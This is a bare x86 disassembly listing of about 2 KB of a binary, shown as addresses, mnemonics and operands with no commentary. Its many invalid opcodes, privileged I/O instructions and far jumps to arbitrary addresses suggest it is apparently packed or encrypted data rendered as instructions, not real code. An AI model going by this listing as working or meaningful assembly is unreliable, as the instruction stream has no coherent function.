  40f1ba:	out    0xb6,al
  40f1bc:	les    edi,FWORD PTR [ebx-0x260e0f05]
  40f1c2:	repz stc 
  40f1c4:	mov    edx,0xf9fefdd1
  40f1c9:	mov    ch,0xdd
  40f1cb:	add    ebx,esi
  40f1cd:	repnz loope 0x40f1a1
  40f1d0:	jmp    0xef48d6e3
  40f1d5:	adc    al,BYTE PTR [edi]
  40f1d7:	mov    ecx,0xb3beb2a6
  40f1dc:	iret   
  40f1dd:	loope  0x40f19a
  40f1df:	into   
  40f1e0:	lock repnz in eax,dx
  40f1e3:	aad    0xd3
  40f1e5:	in     eax,dx
  40f1e6:	jmp    0xe5d5:0xcdfdd7e1
  40f1ed:	(bad)  
  40f1ef:	std    
  40f1f0:	jmp    0x80c:0xcce5c5eb
  40f1f7:	icebp  
  40f1f8:	test   eax,0xb7bcecd6
  40f1fd:	icebp  
  40f1fe:	mov    al,0xee
  40f200:	(bad)  
  40f201:	mov    dh,0xcc
  40f203:	cmc    
  40f204:	shl    bl,1
  40f206:	aam    0xcc
  40f208:	stc    
  40f209:	loopne 0x40f1e5
  40f20b:	(bad)  
  40f20c:	rol    edi,1
  40f20e:	std    
  40f20f:	add    DWORD PTR [esi],eax
  40f211:	pop    es
  40f212:	enter  0x13fa,0x1
  40f216:	fmulp  st(3),st
  40f218:	enter  0xb1dd,0xea
  40f21c:	ret    
  40f21d:	loope  0x40f1ec
  40f21f:	les    esi,FWORD PTR [eax-0x46352b08]
  40f225:	int3   
  40f226:	int3   
  40f227:	in     al,dx
  40f228:	mov    edi,0xbac6eedf
  40f22d:	add    bl,bl
  40f22f:	add    eax,0xe7e9c1de
  40f234:	out    0xca,eax
  40f236:	repz into 
  40f238:	in     eax,dx
  40f239:	mov    edi,0xc7fbadb1
  40f23e:	in     eax,0xe8
  40f240:	stc    
  40f241:	mov    edx,0xb1e8d5ea
  40f246:	cmc    
  40f247:	clc    
  40f248:	rcr    esp,1
  40f24a:	mov    esp,0xd6daf8e5
  40f24f:	pop    es
  40f250:	fisttp DWORD PTR [ecx]
  40f252:	cld    
  40f253:	iret   
  40f254:	jmp    0x40f224
  40f256:	loop   0x40f204
  40f258:	mov    esi,0xd6e4ecc7
  40f25d:	mov    ch,0xac
  40f25f:	out    dx,al
  40f260:	(bad)
  40f263:	mov    ch,0xf1
  40f265:	in     eax,dx
  40f266:	loop   0x40f267
  40f268:	std    
  40f269:	cmc    
  40f26a:	frstpm(287 only) 
  40f26c:	loop   0x40f254
  40f26e:	push   ecx
  40f270:	call   0xfe3aee4b
  40f275:	or     eax,0xe0b3c9f9
  40f27a:	jmp    0x40f243
  40f27c:	mov    esp,0xe4d8b1d0
  40f281:	repnz mov edx,0xd5b4effe
  40f287:	aam    0xec
  40f289:	ret    0xd7c7
  40f28c:	(bad)  
  40f28d:	icebp  
  40f28e:	fcmovb st,st(5)
  40f290:	cmc    
  40f291:	(bad)  
  40f293:	leave  
  40f294:	call   0xa91aed84
  40f299:	in     al,0xf3
  40f29b:	aam    0xd2
  40f29d:	(bad)  
  40f29e:	out    dx,al
  40f29f:	shr    dl,0xea
  40f2a2:	(bad)  
  40f2a4:	mov    ch,0xdc
  40f2a6:	(bad)  
  40f2a8:	lock out 0xfd,eax
  40f2ab:	ret    0xdf07
  40f2ae:	dec    bl
  40f2b0:	(bad)  
  40f2b1:	call   0x134fd1b0
  40f2b6:	cli    
  40f2b7:	(bad)  
  40f2b8:	out    dx,eax
  40f2b9:	int3   
  40f2ba:	shl    esp,0xcf
  40f2bd:	loope  0x40f2a9
  40f2bf:	idiv   al
  40f2c1:	in     al,dx
  40f2c2:	leave  
  40f2c3:	in     al,dx
  40f2c4:	fnstsw WORD PTR [ecx-0x42f833ff]
  40f2ca:	fld    st(2)
  40f2cc:	cmc    
  40f2cd:	add    ah,dh
  40f2cf:	loopne 0x40f2a7
  40f2d1:	retf   0xdece
  40f2d4:	out    0xea,eax
  40f2d6:	repz fnstsw WORD PTR [edi-0x4c2f4819]
  40f2dd:	mov    ebx,0xb4dbedcc
  40f2e2:	out    dx,eax
  40f2e3:	fdivr  DWORD PTR [eax+ecx*8-0x4a312012]
  40f2ea:	mov    esi,0x2f0f0fe
  40f2ef:	icebp  
  40f2f0:	(bad)  
  40f2f1:	not    esi
  40f2f3:	pop    es
  40f2f4:	(bad)  
  40f2f5:	fsubrp st(4),st
  40f2f7:	(bad)  
  40f2f8:	iret   
  40f2f9:	mov    ebp,0xe2acc7c4
  40f2fe:	repz enter 0xb9ec,0xce
  40f303:	rol    DWORD PTR [ebx],1
  40f305:	lock jecxz 0x40f307
  40f308:	int3   
  40f309:	fsubrp st(7),st
  40f30b:	neg    dl
  40f30d:	std    
  40f30e:	ret    
  40f30f:	leave  
  40f310:	fucom  st(1)
  40f312:	or     esp,ecx
  40f314:	int3   
  40f315:	rcl    DWORD PTR [ebx],cl
  40f317:	retf   
  40f318:	out    0xbd,eax
  40f31a:	out    dx,eax
  40f31b:	call   0xb4f8c7ca
  40f320:	imul   BYTE PTR [ebp-0x28070411]
  40f326:	jmp    0xc434d620
  40f32b:	(bad)  
  40f32c:	(bad)  
  40f32d:	jmp    0x40f323
  40f32f:	fucom  st(7)
  40f331:	xlat   BYTE PTR ds:[ebx]
  40f332:	jmp    0x40f31a
  40f334:	add    eax,DWORD PTR [edi]
  40f336:	(bad)  
  40f337:	mov    eax,0xc3e2c0f1
  40f33c:	mov    ch,0xea
  40f33e:	repnz aam 0xb7
  40f341:	test   al,0xcb
  40f344:	std    
  40f345:	sti    
  40f346:	lock (bad) 
  40f349:	(bad)  
  40f34a:	int    0xe6
  40f34c:	sar    ah,0xfc
  40f34f:	inc    cl
  40f351:	cmc    
  40f352:	jmp    0xe8ae:0xe2f20bc4
  40f359:	(bad)  
  40f35a:	jmp    0x40f30e
  40f35c:	shr    bl,0xe9
  40f35f:	in     eax,dx
  40f360:	cli    
  40f361:	(bad)  
  40f362:	fsubr  st,st(0)
  40f364:	(bad)  
  40f365:	rol    DWORD PTR [edx],1
  40f367:	(bad)  
  40f369:	(bad)  
  40f36b:	std    
  40f36c:	mov    esp,0xbe0d402
  40f371:	retf   0xceeb
  40f374:	loope  0x40f35f
  40f376:	shr    edx,cl
  40f378:	test   eax,0xc2f5bcc5
  40f37d:	out    0xc0,al
  40f37f:	sti    
  40f380:	mov    cl,0xe6
  40f382:	int3   
  40f383:	les    esi,FWORD PTR [esi-0x12d2a09]
  40f389:	mov    eax,0xf8e2f1e3
  40f38e:	out    0x8,eax
  40f390:	mov    BYTE PTR [edi],0xeb
  40f393:	jecxz  0x40f357
  40f395:	fld    QWORD PTR [eax]
  40f397:	mov    bl,0xbe
  40f399:	in     eax,dx
  40f39a:	in     al,0xc4
  40f39c:	ret    
  40f39d:	enter  0xcbba,0xe0
  40f3a1:	fistp  QWORD PTR [esi-0x1013312b]
  40f3a7:	mov    ebp,0xe1e2e7fa
  40f3ac:	add    esp,edi
  40f3ae:	retf   0xdccb
  40f3b1:	(bad)  
  40f3b2:	fcmove st,st(1)
  40f3b4:	out    0xd9,eax
  40f3b6:	(bad)  
  40f3b7:	lds    ebp,FWORD PTR [eax-0x2815430e]
  40f3bd:	ret    
  40f3be:	mov    dh,0xda
  40f3c0:	(bad)  
  40f3c1:	aam    0xf6
  40f3c3:	mov    bl,0xcb
  40f3c5:	mov    edx,0xf5c3e1f0
  40f3ca:	clc    
  40f3cb:	pop    es
  40f3cc:	add    bh,al
  40f3ce:	add    al,0xf9
  40f3d0:	xlat   BYTE PTR ds:[ebx]
  40f3d1:	cmc    
  40f3d2:	aam    0xe4
  40f3d4:	loopne 0x40f3ae
  40f3d6:	les    edi,FWORD PTR [edi-0x4f0c3e53]
  40f3dc:	mov    al,0xc7
  40f3de:	loopne 0x40f394
  40f3e0:	mov    dh,0xc9
  40f3e2:	enter  0xcfd4,0xca
  40f3e6:	rol    edx,cl
  40f3e8:	out    dx,eax
  40f3e9:	mov    eax,0xeae40305
  40f3ee:	add    eax,ebp
  40f3f0:	aad    0xb
  40f3f2:	stc    
  40f3f3:	or     cl,BYTE PTR [ecx]
  40f3f5:	out    dx,eax
  40f3f6:	fcmove st,st(7)
  40f3f8:	shl    BYTE PTR [ebp-0x3c1c2340],cl
  40f3fe:	lock mov ecx,0xd8d9d4f8
  40f404:	les    edi,FWORD PTR [eax-0x3d1d092b]
  40f40a:	(bad)  
  40f40b:	clc    
  40f40c:	bnd jmp 0x40f405
  40f40f:	fild   DWORD PTR [edx]
  40f411:	add    al,0xff
  40f413:	retf   0xe413
  40f416:	retf   
  40f417:	iret   
  40f418:	mov    esi,0xb4e1e1c6
  40f41d:	jecxz  0x40f3e7
  40f41f:	stc    
  40f420:	in     eax,0xb1
  40f422:	int3   
  40f423:	cmc    
  40f424:	lock repnz enter 0xc2f1,0xf6
  40f42a:	hlt    
  40f42b:	in     eax,0x1
  40f42d:	fadd   st,st(7)
  40f42f:	call   edi
  40f431:	aad    0xee
  40f433:	call   0xaf21d227
  40f438:	call   0xd4edb91a
  40f43d:	mov    bh,0xeb
  40f43f:	mov    ecx,0xfddafef9
  40f444:	shr    esi,cl
  40f446:	retf   0xf5fe
  40f449:	repnz in eax,dx
  40f44b:	jecxz  0x40f44c
  40f44d:	push   es
  40f44e:	fsub   st,st(4)
  40f450:	jecxz  0x40f41b
  40f452:	jmp    0x40f41f
  40f454:	add    bl,ah
  40f456:	loop   0x40f422
  40f458:	(bad)  
  40f459:	lock jecxz 0x40f439
  40f45c:	mov    dh,0xb6
  40f45e:	out    dx,eax
  40f45f:	lock jmp 0xd6cc:0xbfd6b9eb
  40f467:	enter  0xef,0xbd
  40f46b:	repnz (bad) 
  40f46d:	repz (bad) 
  40f46f:	(bad)  
  40f471:	in     eax,0x0
  40f473:	mov    DWORD PTR [ebx],0xe7e1d3c8
  40f479:	out    0xc2,al
  40f47b:	loop   0x40f44c
  40f47d:	lods   al,BYTE PTR ds:[esi]
  40f47e:	in     al,0xb4
  40f480:	jmp    0xcf32d45d
  40f485:	mov    ecx,0xeecebcd7
  40f48a:	fidivr WORD PTR [edi-0x2a2a0c42]
  40f490:	loop   0x40f48a
  40f492:	or     ecx,ebp
  40f494:	in     al,0xe1
  40f496:	add    eax,eax
  40f498:	stos   BYTE PTR es:[edi],al
  40f499:	in     al,dx
  40f49a:	mov    cl,0xc5
  40f49c:	out    0xee,eax
  40f49e:	mov    dl,0xaf
  40f4a0:	int3   
  40f4a1:	fdivr  DWORD PTR [ebx-0x2f37214c]
  40f4a7:	mov    esi,0xc7d2cecf
  40f4ac:	rcl    bh,cl
  40f4ae:	fincstp 
  40f4b0:	ret    0xfbfc
  40f4b3:	or     ah,bl
  40f4b5:	std    
  40f4b6:	fmul   st(6),st
  40f4b8:	test   eax,0xeab2e8c4
  40f4bd:	in     eax,0xed
  40f4bf:	mov    al,0xcf
  40f4c1:	inc    ah
  40f4c3:	int3   
  40f4c4:	mov    eax,0xdcf5dece
  40f4c9:	stc    
  40f4ca:	ret    
  40f4cb:	loopne 0x40f4c3
  40f4cd:	(bad)  
  40f4cf:	or     al,bh
  40f4d1:	jmp    edx
  40f4d3:	aam    0xc4
  40f4d5:	retf   
  40f4d6:	enter  0xe6e1,0xb0
  40f4da:	in     eax,dx
  40f4db:	fst    st(3)
  40f4dd:	repz repz (bad) 
  40f4e0:	call   ebp
  40f4e2:	lods   al,BYTE PTR ds:[esi]
  40f4e3:	mov    ebp,0xfbe3bee9
  40f4e8:	jecxz  0x40f4bc
  40f4ea:	(bad)  
  40f4ec:	cli    
  40f4ed:	loop   0x40f4b1
  40f4ef:	clc    
  40f4f0:	(bad)  
  40f4f2:	fiadd  WORD PTR [eax]
  40f4f4:	(bad)  [edx]
  40f4f6:	in     al,dx
  40f4f7:	call   0xe32fa4e6
  40f4fc:	shl    al,cl
  40f4fe:	in     al,dx
  40f4ff:	mov    bh,0xf4
  40f501:	into   
  40f502:	lds    esi,FWORD PTR [esi+ebx*8-0x324430fd]
  40f509:	out    dx,al
  40f50a:	clc    
  40f50b:	mov    ebp,0xfada0bc7
  40f510:	fiadd  DWORD PTR [eax+edi*8]
  40f513:	fiadd  WORD PTR [esp+ebp*8]
  40f516:	(bad)  
  40f518:	call   0xf6f1a2dd
  40f51d:	in     al,dx
  40f51e:	fldln2 
  40f520:	fld    st(7)
  40f522:	leave  
  40f523:	mov    ecx,0xb9f6ffff
  40f528:	(bad)  
  40f52a:	loop   0x40f4e9
  40f52c:	clc    
  40f52d:	bnd jmp 0x45cefd
  40f533:	pop    es
  40f534:	add    al,0xe6
  40f536:	fsubp  st(0),st
  40f538:	leave  
  40f539:	jecxz  0x40f527
  40f53b:	(bad)  
  40f53d:	rcr    dl,cl
  40f53f:	jmp    0xc526e71a
  40f544:	shl    edx,1
  40f546:	(bad)  
  40f548:	add    bh,cl
  40f54a:	add    bl,dl
  40f54c:	repz repz stc 
  40f54f:	push   es
  40f550:	shl    al,0xe8
  40f553:	out    dx,eax
  40f554:	jmp    0x40f545
  40f556:	enter  0xbcc3,0xf2
  40f55a:	rol    ecx,1
  40f55c:	hlt    
  40f55d:	mov    ah,0xc4
  40f55f:	jmp    0xd719e063
  40f564:	mov    ah,0xfb
  40f566:	mov    al,0xff
  40f568:	mov    eax,0xe4dad7fa
  40f56d:	cmc    
  40f56e:	(bad)  
  40f56f:	leave  
  40f570:	pop    es
  40f571:	or     ecx,edi
  40f573:	or     DWORD PTR ds:0xbfc3dfe4,eax
  40f579:	shl    edx,1
  40f57b:	in     al,dx
  40f57c:	ret    
  40f57d:	lock out 0xc6,eax
  40f580:	shl    dl,cl
  40f582:	mov    esi,0xedf0ebdf
  40f587:	mov    ebx,0xf1ede6fa
  40f58c:	aam    0xf5
  40f58e:	(bad)  
  40f58f:	fst    st(6)
  40f591:	fcmovbe st,st(4)
  40f593:	into   
  40f594:	sti    
  40f595:	out    dx,al
  40f596:	icebp  
  40f597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f598:	lods   eax,DWORD PTR ds:[esi]
  40f599:	in     al,0xc1
  40f59b:	hlt    
  40f59c:	aad    0xcb
  40f59e:	mov    bh,0xd2
  40f5a0:	aam    0xc6
  40f5a2:	shl    esp,1
  40f5a4:	mov    ebp,0xbdd4b4fb
  40f5a9:	into   
  40f5aa:	in     eax,dx
  40f5ab:	cli    
  40f5ac:	clc    
  40f5ad:	xlat   BYTE PTR ds:[ebx]
  40f5ae:	lock push es
  40f5b0:	jmp    0xfc38fa80
  40f5b5:	int3   
  40f5b6:	(bad)  
  40f5b8:	loop   0x40f58b
  40f5ba:	in     eax,dx
  40f5bb:	ror    ecx,1
  40f5bd:	idiv   edx
  40f5bf:	mov    dh,0xc5
  40f5c1:	in     al,0xe9
  40f5c3:	cld    
  40f5c4:	aad    0xed
  40f5c6:	ret    0xf3c3
  40f5c9:	rol    cl,0xf2
  40f5cc:	cli    
  40f5cd:	imul   bl
  40f5cf:	ror    dl,0xd6
  40f5d2:	fcmovnu st,st(5)
  40f5d4:	add    dl,bl
  40f5d6:	out    0xc1,eax
  40f5d8:	jmp    0x40f5be
  40f5da:	loope  0x40f5d0
  40f5dc:	iret   
  40f5dd:	out    0xe0,al
  40f5df:	ror    ecx,1
  40f5e1:	out    0xdb,al
  40f5e3:	repnz into 
  40f5e5:	in     al,dx
  40f5e6:	add    bh,BYTE PTR [edi-0xe433e3d]
  40f5ec:	shl    dl,cl
  40f5ee:	aam    0xfd
  40f5f0:	ret    0xdbe1
  40f5f3:	loop   0x40f5f0
  40f5f5:	pop    es
  40f5f6:	call   0xbeefb9b8
  40f5fb:	into   
  40f5fc:	(bad)  
  40f5fd:	hlt    
  40f5fe:	mov    dl,0xf6
  40f600:	mov    dl,0xf3
  40f602:	jmp    0xed39c204
  40f607:	loope  0x40f5e9
  40f609:	hlt    
  40f60a:	fnstcw WORD PTR [edi-0xb2a3d2f]
  40f610:	jmp    0x46cfdd
  40f615:	push   cs
  40f616:	push   cs
  40f617:	mov    bl,0xaa
  40f619:	mov    cl,0xf3
  40f61b:	ror    esi,1
  40f61d:	jecxz  0x40f613
  40f61f:	icebp  
  40f620:	mov    edx,0xb9e9d6f6
  40f625:	add    al,bl
  40f627:	out    dx,al
  40f628:	fcmovu st,st(4)
  40f62a:	fst    st(6)
  40f62c:	loop   0x40f5ee
  40f62e:	add    dl,ah
  40f630:	bswap  ecx
  40f632:	shr    cl,0xde
  40f635:	fdivp  st(2),st
  40f637:	call   0xe533bae9
  40f63c:	shl    cl,0xd5
  40f63f:	shl    DWORD PTR [ecx-0x4023024b],1
  40f645:	fsub   st(7),st
  40f647:	mov    edx,0xf4d5f9e8
  40f64c:	(bad)  
  40f64e:	mul    ch
  40f650:	add    al,0xfe
  40f652:	in     eax,dx
  40f653:	add    dl,al
  40f655:	fsubrp st(0),st
  40f657:	shr    dl,cl
  40f659:	icebp  
  40f65a:	out    dx,eax
  40f65b:	retf   
  40f65c:	hlt    
  40f65d:	out    dx,eax
  40f65e:	into   
  40f65f:	rcl    edi,1
  40f661:	mov    eax,0xc9e3f5f4
  40f666:	ror    edi,cl
  40f668:	mov    dh,0xf3
  40f66a:	cli    
  40f66b:	add    al,0xd0
  40f66d:	fincstp 
  40f66f:	(bad)  
  40f671:	out    0xe4,al
  40f673:	in     al,dx
  40f674:	int    0xce
  40f676:	iret   
  40f677:	retf   
  40f678:	retf   0xc2ea
  40f67b:	mov    al,0xc6
  40f67d:	aad    0xce
  40f67f:	rol    bh,cl
  40f681:	stc    
  40f682:	mov    bh,0xba
  40f684:	lock mov ch,0xde
  40f687:	mov    eax,0xedbfdeba
  40f68c:	loop   0x40f678
  40f68e:	add    edi,esp
  40f690:	sti    
  40f691:	aad    0xe3
  40f693:	out    dx,eax
  40f694:	fimul  DWORD PTR [ecx]
  40f696:	add    al,0xe1
  40f698:	leave  
  40f699:	mul    bh
  40f69b:	icebp  
  40f69c:	mov    cl,0xf6
  40f69e:	retf   0xfbd7
  40f6a1:	(bad)  
  40f6a2:	neg    dh
  40f6a4:	int3   
  40f6a5:	not    esi
  40f6a7:	jecxz  0x40f67c
  40f6a9:	out    0x3,eax
  40f6ab:	(bad)  
  40f6ad:	push   es
  40f6ae:	loop   0x40f6a9
  40f6b0:	loope  0x40f6c0
  40f6b2:	push   es
  40f6b3:	fsubrp st(5),st
  40f6b5:	adc    bl,bh
  40f6b7:	loop   0x40f6a1
  40f6b9:	mov    edi,0xead5c5c1
  40f6be:	int3   
  40f6bf:	mov    ah,0xc6
  40f6c1:	mov    dh,0xcd
  40f6c3:	(bad)  
  40f6c5:	mov    esp,0x2ddd9cc
  40f6ca:	lock (bad) 
  40f6cc:	loope  0x40f6d9
  40f6ce:	add    BYTE PTR [edi],al
  40f6d0:	hlt    
  40f6d1:	fsubp  st(0),st
  40f6d3:	lds    ecx,FWORD PTR [edi]
  40f6d5:	in     eax,0xfd
  40f6d7:	mov    esp,0xc2e8b2c9
  40f6dc:	into   
  40f6dd:	leave  
  40f6de:	loop   0x40f6a7
  40f6e0:	fcmovne st,st(4)
  40f6e2:	ror    cl,cl
  40f6e4:	retf   
  40f6e5:	rcl    bh,1
  40f6e7:	stc    
  40f6e8:	int3   
  40f6e9:	ret    0xd0e0
  40f6ec:	mov    edx,0xf4e7dc0b
  40f6f1:	jmp    0xcd24c4e4
  40f6f6:	repz call 0xc329e4e1
  40f6fc:	mov    dh,0xda
  40f6fe:	cmc    
  40f6ff:	fmul   st,st(5)
  40f701:	int3   
  40f702:	mov    ah,0xd8
  40f704:	lock jmp 0xe6e3:0xe1f2d3f5
  40f70c:	pop    es
  40f70d:	add    dh,bh
  40f70f:	jmp    0xe4cd:0x9fbc6ea
  40f716:	retf   0xa9ad
  40f719:	mov    edi,0xf3f4c8b3
  40f71e:	out    dx,eax
  40f71f:	loopne 0x40f6f7
  40f721:	into   
  40f722:	fucomi st,st(2)
  40f724:	ror    esi,1
  40f726:	cld    
  40f727:	rol    bl,cl
  40f729:	cld    
  40f72a:	clc    
  40f72b:	ret    
  40f72c:	fcomi  st,st(7)
  40f72e:	retf   
  40f72f:	icebp  
  40f730:	fcmove st,st(1)
  40f732:	jmp    0xe848d92b
  40f737:	stos   DWORD PTR es:[edi],eax
  40f738:	ror    edi,0xd3
  40f73b:	imul   al
  40f73d:	in     eax,dx
  40f73e:	mov    ah,0xf8
  40f740:	retf   0xacb7
  40f743:	(bad)  
  40f744:	shl    BYTE PTR [ecx-0x2d3d2408],cl
  40f74a:	mov    eax,0xf1ead6c0
  40f74f:	(bad)  
  40f750:	or     BYTE PTR [eax],al
  40f752:	(bad)  
  40f753:	fcmovne st,st(3)
  40f755:	leave  
  40f756:	stc    
  40f757:	mov    dl,0xbd
  40f759:	out    0xad,eax
  40f75b:	aam    0xc2
  40f75d:	lods   eax,DWORD PTR ds:[esi]
  40f75e:	(bad)  
  40f75f:	aad    0xdb
  40f761:	leave  
  40f762:	repnz shl ah,cl
  40f765:	cld    
  40f766:	into   
  40f767:	iret   
  40f768:	(bad)  
  40f76a:	mov    edi,0x904d4e7
  40f76f:	fstp   st(6)
  40f771:	stc    
  40f772:	clc    
  40f773:	fsub   st,st(3)
  40f775:	jecxz  0x40f74a
  40f777:	mov    esi,0xc8e7e9f0
  40f77c:	lods   al,BYTE PTR ds:[esi]
  40f77d:	aad    0xea
  40f77f:	repnz rcr esi,1
  40f782:	aam    0xd6
  40f784:	mov    ch,0xd6
  40f786:	std    
  40f787:	ret    0xf307
  40f78a:	mul    ah
  40f78c:	lock ret 
  40f78e:	jmp    0x40f78b
  40f790:	ret    0xd6
  40f793:	leave  
  40f794:	add    ch,ah
  40f796:	clc    
  40f797:	ret    
  40f798:	lock shl edx,cl
  40f79b:	mov    al,0xca
  40f79d:	jecxz  0x40f755
  40f79f:	retf   0xdfc7
  40f7a2:	int    0xb5
  40f7a4:	sar    esp,cl
  40f7a6:	cld    
  40f7a7:	fsubr  st(2),st
  40f7a9:	rcl    ebx,0xd6
  40f7ac:	push   ebx
  40f7ae:	sar    bl,cl
  40f7b0:	hlt    
  40f7b1:	mov    ebp,0x4e6efcb
  40f7b6:	loope  0x40f79f
  40f7b8:	mov    cl,0xb1
  40f7ba:	mov    bh,0xc9
  40f7bc:	in     al,dx
  40f7bd:	iret   
  40f7be:	les    edi,FWORD PTR [ebx-0x320f210f]
  40f7c4:	idiv   ah
  40f7c6:	jecxz  0x40f7b0
  40f7c8:	add    ch,ch
  40f7ca:	(bad)  
  40f7cb:	in     al,dx
  40f7cc:	std    
  40f7cd:	pop    es
  40f7ce:	(bad)
  40f7d1:	jmp    0xdb3902cb
  40f7d6:	fcmovb st,st(5)
  40f7d8:	leave  
  40f7d9:	lods   al,BYTE PTR ds:[esi]
  40f7da:	icebp  
  40f7db:	in     eax,0xd2
  40f7dd:	retf   
  40f7de:	int3   
  40f7df:	(bad)  
  40f7e0:	inc    ebp
  40f7e2:	fcmovb st,st(5)
  40f7e4:	(bad)  
  40f7e5:	mov    ah,0xd2
  40f7e7:	fcmovbe st,st(6)
  40f7e9:	cli    
  40f7ea:	fcmovb st,st(6)
  40f7ec:	out    0xe2,al
  40f7ee:	cli    
  40f7ef:	mul    cl
  40f7f1:	add    ah,cl
  40f7f3:	clc    
  40f7f4:	jmp    0xf3ebf1d9
  40f7f9:	mov    bh,0xce
  40f7fb:	iret   
  40f7fc:	mov    cl,0xe7
  40f7fe:	fchs   
  40f800:	lock in al,0xb0
  40f803:	in     eax,0xbb
  40f805:	mov    ch,0xef
  40f807:	mov    ebx,0xc5e2cefa
  40f80c:	mov    edx,0xeae1c6de
  40f811:	hlt    
  40f812:	out    0xfb,eax
  40f814:	add    edi,ecx
  40f816:	cli    
  40f817:	in     al,0xc5
  40f819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f81a:	lock in eax,0xc8
  40f81d:	out    dx,al
  40f81e:	out    0xba,eax
  40f820:	in     eax,0xd8
  40f822:	inc    ah
  40f824:	fmul   st,st(3)
  40f826:	repz cmc 
  40f828:	aam    0xc2
  40f82a:	rol    DWORD PTR ds:0x1fbc2fb,cl
  40f830:	add    al,0xf5
  40f832:	mov    DWORD PTR ds:0xe2ed0fe4,0xcfe1efce
  40f83c:	repz aad 0xca
  40f83f:	loopne 0x40f835
  40f841:	(bad)  
  40f842:	jmp    0x40f81d
  40f844:	mov    eax,0xfdf2dfbb
  40f849:	rcl    bl,1
  40f84b:	div    edi
  40f84d:	loopne 0x40f851
  40f84f:	aam    0xe7
  40f851:	shr    ebx,0xc7
  40f854:	iret   
  40f855:	or     eax,0xcacadfda
  40f85a:	loope  0x40f82b
  40f85c:	icebp  
  40f85d:	in     al,dx
  40f85e:	mov    edx,0xb4b7f6ed
  40f863:	cld    
  40f864:	retf   0xfad8
  40f867:	div    ah
  40f869:	icebp  
  40f86a:	push   esi
  40f86c:	fchs   
  40f86e:	dec    cl
  40f870:	add    ah,ah
  40f872:	pop    es
  40f873:	aam    0xc5
  40f875:	out    0xe1,al
  40f877:	fild   QWORD PTR [edi-0x3b350f30]
  40f87d:	in     al,dx
  40f87e:	xlat   BYTE PTR ds:[ebx]
  40f87f:	repnz repnz sar DWORD PTR [ebx-0x242f1b2e],1
  40f887:	shl    ecx,1
  40f889:	loopne 0x40f857
  40f88b:	cmc    
  40f88c:	aam    0xf3
  40f88e:	add    ah,ah
  40f890:	pop    es
  40f891:	retf   
  40f892:	(bad)  
  40f893:	cld    
  40f894:	clc    
  40f895:	push   cs
  40f896:	jmp    0x40f87f
  40f898:	mov    esi,0xe7e1e0a9
  40f89d:	cmc    
  40f89e:	shr    ch,1
  40f8a0:	out    0xb0,eax
  40f8a2:	fnstcw WORD PTR [ebx-0x2332347]
  40f8a8:	enter  0xf2f3,0xd3
  40f8ac:	mov    esp,0xc4e6e6f5
  40f8b1:	loope  0x40f87d
  40f8b3:	(bad)  
  40f8b5:	add    al,0xe7
  40f8b7:	out    0xf7,al
  40f8b9:	out    dx,eax
  40f8ba:	lods   al,BYTE PTR ds:[esi]
  40f8bb:	(bad)  
  40f8bc:	out    dx,eax
  40f8bd:	shl    ch,1
  40f8bf:	int    0xec
  40f8c1:	mov    edx,0xf9dfeac9
  40f8c6:	enter  0xcce3,0xdb
  40f8ca:	shl    ebx,1
  40f8cc:	ret    
  40f8cd:	(bad)  
  40f8ce:	cmc    
  40f8cf:	shr    edx,0xdd
  40f8d2:	call   0xf25dbb8
  40f8d7:	loop   0x40f882
  40f8d9:	loope  0x40f899
  40f8db:	bnd call 0xf6f2aea1
  40f8e1:	in     eax,dx
  40f8e2:	enter  0xd2ce,0xe2
  40f8e6:	not    ebx
  40f8e8:	cmc    
  40f8e9:	clc    
  40f8ea:	sar    ebp,1
  40f8ec:	jecxz  0x40f8e4
  40f8ee:	cld    
  40f8ef:	clc    
  40f8f0:	cmc    
  40f8f1:	out    dx,eax
  40f8f2:	add    bl,bl
  40f8f4:	leave  
  40f8f5:	or     ecx,DWORD PTR [esi]
  40f8f7:	enter  0xbfc6,0xe1
  40f8fb:	aad    0xc2
  40f8fd:	ret    0xb7c7
  40f900:	repnz shr edx,cl
  40f903:	iret   
  40f904:	fsub   st(0),st
  40f906:	mov    al,0xe0
  40f908:	out    dx,eax
  40f909:	mov    ecx,0xd4d4c3c6
  40f90e:	cmc    
  40f90f:	out    0xc2,al
  40f911:	loop   0x40f922
  40f913:	or     DWORD PTR [edx],ecx
  40f915:	fcmovnbe st,st(2)
  40f917:	mov    esp,0xb7c1cbcb
  40f91c:	into   
  40f91d:	shl    esp,cl
  40f91f:	cli    
  40f920:	sti    
  40f921:	out    dx,al
  40f922:	out    dx,eax
  40f923:	(bad)  
  40f924:	fstp   st(6)
  40f926:	in     al,dx
  40f927:	jmp    0xe608cc01
  40f92c:	out    0x5,al
  40f92e:	add    eax,ebx
  40f930:	fxch   st(3)
  40f932:	fcomp  st(7)
  40f934:	fucomip st,st(6)
  40f936:	or     ch,BYTE PTR [eax-0x42523724]
  40f93c:	int3   
  40f93d:	out    dx,eax
  40f93e:	lods   al,BYTE PTR ds:[esi]
  40f93f:	out    0xd5,eax
  40f941:	mov    edx,0xbfeddae8
  40f946:	mov    ebp,0xd0bef9ec
  40f94b:	jecxz  0x40f910
  40f94d:	add    DWORD PTR [ecx],eax
  40f94f:	mov    edi,0xeae3fb07
  40f954:	clc    
  40f955:	call   0xe12aba1e
  40f95a:	jmp    0x40f909
  40f95c:	leave  
  40f95d:	retf   0xc4f3
  40f960:	mov    edx,0xbad7d2c4
  40f965:	mov    ch,0xc9
  40f967:	fnstsw WORD PTR [eax-0xc1a260a]
  40f96d:	std    
  40f96e:	out    0x3,eax
  40f970:	ret    0xf6e7
  40f973:	in     eax,0xfc
  40f975:	add    eax,0xddecaf04
  40f97a:	mov    dl,0xac
  40f97c:	lods   al,BYTE PTR ds:[esi]
  40f97d:	in     al,0xc2
  40f97f:	iret   
  40f980:	mov    ah,0xc8
  40f982:	fcmove st,st(7)
  40f984:	mov    ah,0xcf
  40f986:	idiv   DWORD PTR [ecx+0x5fcf103]
  40f98c:	mul    bh
  40f98e:	cli    
  40f98f:	or     ah,bh
  40f991:	retf   
  40f992:	(bad)  
  40f993:	iret   
  40f994:	retf   0x3cb
  40f997:	lods   al,BYTE PTR ds:[esi]
  40f998:	mov    dl,0xef
  40f99a:	rcl    ch,cl
  40f99c:	(bad)  
  40f99d:	mov    dl,0xe5
  40f99f:	out    dx,al
  40f9a0:	repz (bad) 
  40f9a2:	int3   
  40f9a3:	sti    
  40f9a4:	jmp    0xf53adc8b
  40f9a9:	(bad)  
  40f9aa:	into   
  40f9ab:	rol    DWORD PTR ds:0xe0c0de03,0xdd
  40f9b2:	fsub   st,st(6)
